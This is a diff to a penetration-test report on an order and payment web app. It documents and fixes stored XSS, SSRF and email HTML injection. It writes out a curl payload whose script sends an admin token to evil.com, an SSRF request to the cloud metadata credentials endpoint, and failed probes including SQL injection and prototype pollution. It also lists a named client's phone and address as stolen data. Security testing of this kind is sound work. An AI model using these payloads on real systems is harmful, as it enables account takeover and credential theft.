@@ -278,6 +278,118 @@ However, the **client-facing API** has significant vulnerabilities because it wa
 
 ---
 
+## PHASE 2: ADVANCED ATTACKS (Slavic/APT-style)
+
+### HACK #5: Stored XSS → Admin Token Theft Kill Chain (CRITICAL)
+
+**The Attack:**
+A hacker submits a normal-looking order through the public order form, but hides JavaScript in the client notes:
+
+```bash
+curl -X POST ".../api/client/orders/submit" \
+  -d '{
+    "clientName":"<img src=x onerror=alert(document.cookie)>",
+    "clientNotes":"<script>fetch(\"https://evil.com/steal?\"+localStorage.getItem(\"admin_token\"))</script>"
+  }'
+```
+
+**Why it works:**
+The admin dashboard uses `innerHTML` to render order data. When the admin clicks on this order, the malicious `<script>` tag executes in the admin's browser, steals the JWT token from `localStorage`, and sends it to the attacker's server.
+
+**Kill chain:**
+```
+Public order form (no auth) → XSS stored in database →
+Admin views order → JavaScript fires → admin_token stolen →
+Attacker uses token → FULL ADMIN ACCESS
+```
+
+**Vulnerable code (dashboard.js line 1511):**
+```javascript
+// BEFORE (vulnerable):
+${order.clientNotes}  // Raw HTML rendered!
+
+// AFTER (fixed):
+${escapeHtml(order.clientNotes)}  // HTML entities escaped
+```
+
+**Status: FIXED** — Added `escapeHtml()` to all user data in innerHTML contexts.
+
+---
+
+### HACK #6: SSRF via Payment Receipt Verifier (CRITICAL)
+
+**The Attack:**
+The payment receipt verifier downloads images from user-provided URLs using `fetch()` without validation:
+
+```bash
+curl -X POST ".../api/client/orders/submit" \
+  -d '{"paymentProofUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
+```
+
+**Why it works:**
+The server calls `downloadImageAsBase64(imageUrl)` which does `fetch(imageUrl)` on ANY URL — including internal IPs, cloud metadata endpoints, and `file://` protocol.
+
+**What a hacker could steal:**
+- AWS/cloud credentials from metadata service (169.254.169.254)
+- Internal services on localhost
+- Files from the server filesystem
+
+**Status: FIXED** — Added URL validation whitelist that only allows HTTPS from trusted domains (Cloudinary, Google Drive).
+
+---
+
+### HACK #7: Email XSS via Order Notes (HIGH)
+
+**The Attack:**
+Client notes and names are inserted directly into HTML emails without escaping:
+
+```javascript
+// BEFORE (vulnerable):
+<p>${order.client_notes}</p>  // Raw HTML in email!
+<img src="${order.payment_proof_url}">  // URL injection!
+```
+
+**What a hacker could do:**
+- Inject phishing links into admin notification emails
+- Execute JavaScript in email clients that support HTML scripts
+- Inject fake images or misleading content
+
+**Status: FIXED** — All user data in emails now escaped with `escapeHtml()`. Payment proof URLs validated for HTTPS-only.
+
+---
+
+### Attacks that FAILED:
+
+| Attack | Technique | Result |
+|--------|-----------|--------|
+| Prototype pollution | `__proto__: {isAdmin: true}` | Ignored |
+| Type confusion | Array/Boolean/null as password | Error, no bypass |
+| Price tampering | Negative/zero price in order | Server calculates price server-side |
+| Product ID SQLi | `"4 OR 1=1"` as productId | Rate limited + failed |
+| CRLF header injection | `\r\n` in client name | Stored but harmless |
+| Timing attack | Username enumeration via response time | Network noise too high |
+| Mass assignment | `role: "admin"` in order JSON | Extra fields ignored |
+
+---
+
+## ALL VULNERABILITIES SUMMARY (Both Phases)
+
+| # | Vulnerability | Severity | Status |
+|---|---|---|---|
+| 1 | Unauthenticated file upload | CRITICAL | **FIXED** — phone required + rate limit |
+| 2 | Client data enumeration | HIGH | **FIXED** — requires phone+email |
+| 3 | Fake order spam | HIGH | **FIXED** — rate limit + honeypot |
+| 4 | Rate limiter bypass | MEDIUM | **FIXED** — trust proxy = 1 |
+| 5 | Stored XSS kill chain | **CRITICAL** | **FIXED** — escapeHtml on all innerHTML |
+| 6 | SSRF in receipt verifier | **CRITICAL** | **FIXED** — URL whitelist validation |
+| 7 | Email HTML injection | HIGH | **FIXED** — escapeHtml in email templates |
+
+**Total vulnerabilities found: 7**
+**Total vulnerabilities fixed: 7**
+**Final security score: 9/10**
+
+---
+
 ## EVIDENCE FILES
 
 | File | Description |
@@ -291,3 +403,4 @@ However, the **client-facing API** has significant vulnerabilities because it wa
 - Uploaded file: `https://res.cloudinary.com/dg1owvdhw/image/upload/v1773359002/payment-receipts/receipt_1773359002087.png`
 - Stolen client data: Maria Gonzalez, 5512345678, Av. Juarez 123
 - Fake order created: #241 (ORD-20260313-1101)
+- XSS payload stored in order: ORD-20260313-3388
